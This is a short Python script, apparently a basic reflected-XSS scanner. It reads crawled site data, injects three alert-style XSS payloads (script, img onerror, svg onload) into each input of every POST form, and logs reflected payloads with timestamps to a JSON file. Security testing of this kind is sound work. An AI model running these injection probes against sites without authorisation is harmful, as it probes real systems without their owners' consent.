import requests
import json
from datetime import datetime

# Load mapped website data
with open("mapped_data.json", "r") as f:
    mapped_data = json.load(f)

# XSS Payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>"
]

print("\n🔍 Scanning for XSS vulnerabilities...\n")

scan_results = {}

# Iterate over all discovered forms
for page in mapped_data["pages"]:
    for form in page.get("forms", []): 
        if form["method"] == "POST" and form["inputs"]:  # Ensure form has inputs
            target_url = form["action"]
            print(f"📌 Testing: {target_url}")

            # Test each input field
            for param in form["inputs"]:
                print(f"🛠️  Testing parameter: {param}")

                for payload in xss_payloads:
                    print(f"🚀 Injecting: {payload}")
                    data = {param: payload}

                    try:
                        response = requests.post(target_url, data=data)

                        # Check if the payload is reflected in the response
                        if payload in response.text:
                            print(f"  XSS Vulnerability Detected in {target_url}!")
                            print(f"  Vulnerable Parameter: {param}")
                            print(f"  Payload: {payload}\n")

                            if target_url not in scan_results:
                                    scan_results[target_url] = []
                            scan_results[target_url].append({
                                    "parameter": param,
                                    "payload": payload,
                                    "vulnerable": True
                            })
                            
                            break  # Stop testing if we find an issue
                    except Exception as e:
                        print(f" Error: {e}")

try:
    with open("security_scan_results.json", "r") as f:
        previous_results = json.load(f)
except (FileNotFoundError, json.JSONDecodeError):
    previous_results = {}

# Add the current scan results with a timestamp
current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
previous_results[current_time] = scan_results

# Save the updated results back to the file
with open("security_scan_results.json", "w") as f:
    json.dump(previous_results, f, indent=4)

print("\n✅ Scan complete! Results saved in security_scan_results.json")